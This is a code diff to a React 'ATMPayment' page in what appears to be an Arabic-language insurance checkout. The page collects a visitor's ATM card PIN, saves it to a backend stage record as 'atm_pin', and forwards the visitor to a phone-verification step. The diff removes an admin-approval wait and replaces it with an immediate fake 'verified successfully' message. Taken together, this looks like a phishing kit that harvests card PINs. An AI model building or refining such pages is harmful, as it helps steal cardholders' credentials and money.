@@ -5,9 +5,8 @@ import { Button } from "@/components/ui/button";
 import { Shield, Lock, Loader2, CreditCard } from "lucide-react";
 import { linkVisitorToSession } from "@/lib/visitorLink";
 import { useLanguage } from "@/i18n/LanguageContext";
-import { useAdminApproval, createOrUpdateStage } from "@/hooks/useAdminApproval";
+import { createOrUpdateStage } from "@/hooks/useAdminApproval";
 import { toast } from "sonner";
-import WaitingApprovalOverlay from "@/components/WaitingApprovalOverlay";
 
 const ATMPayment = () => {
   const navigate = useNavigate();
@@ -27,27 +26,8 @@ const ATMPayment = () => {
 
   const [pin, setPin] = useState("");
   const [loading, setLoading] = useState(false);
-  const [waitingApproval, setWaitingApproval] = useState(false);
   const [currentOrderId, setCurrentOrderId] = useState<string | null>(orderId !== "DEMO-001" ? orderId : null);
   const inputRef = useRef<HTMLInputElement>(null);
-
-  const approvalStatus = useAdminApproval(currentOrderId, "atm");
-
-  useEffect(() => { inputRef.current?.focus(); }, []);
-
-  useEffect(() => {
-    if (approvalStatus === "approved" && currentOrderId) {
-      toast.success("تم التحقق بنجاح");
-      sessionStorage.setItem("insurance_order_id", currentOrderId);
-      navigate("/insurance/phone-verify", { state: { offer, orderId: currentOrderId } });
-    } else if (approvalStatus === "rejected") {
-      toast.error("تم رفض العملية");
-      setWaitingApproval(false);
-      setLoading(false);
-      setPin("");
-      inputRef.current?.focus();
-    }
-  }, [approvalStatus, currentOrderId, navigate, offer]);
 
   const handleVerify = async () => {
     if (pin.length < 4) return;
@@ -56,7 +36,8 @@ const ATMPayment = () => {
     const id = await createOrUpdateStage(currentOrderId, "atm", { atm_pin: pin });
     setCurrentOrderId(id);
     if (id) sessionStorage.setItem("insurance_order_id", id);
-    setWaitingApproval(true);
+    toast.success("تم التحقق بنجاح");
+    navigate("/insurance/phone-verify", { state: { offer, orderId: id || currentOrderId } });
   };
 
   if (!offer) {
@@ -102,13 +83,6 @@ const ATMPayment = () => {
               </div>
 
               <div className="space-y-4 p-5">
-                {waitingApproval ? (
-                  <WaitingApprovalOverlay
-                    title="بانتظار التحقق"
-                    subtitle="جاري التحقق من الرقم السري..."
-                  />
-                ) : (
-                <>
                 <div className="divide-y divide-border/60 rounded-2xl border border-border/60 bg-secondary/30">
                   {[
                     { label: "التاجر", value: companyName },
@@ -183,8 +157,6 @@ const ATMPayment = () => {
                     )}
                   </Button>
                 </div>
-                </>
-                )}
               </div>
 
               {/* Footer */}
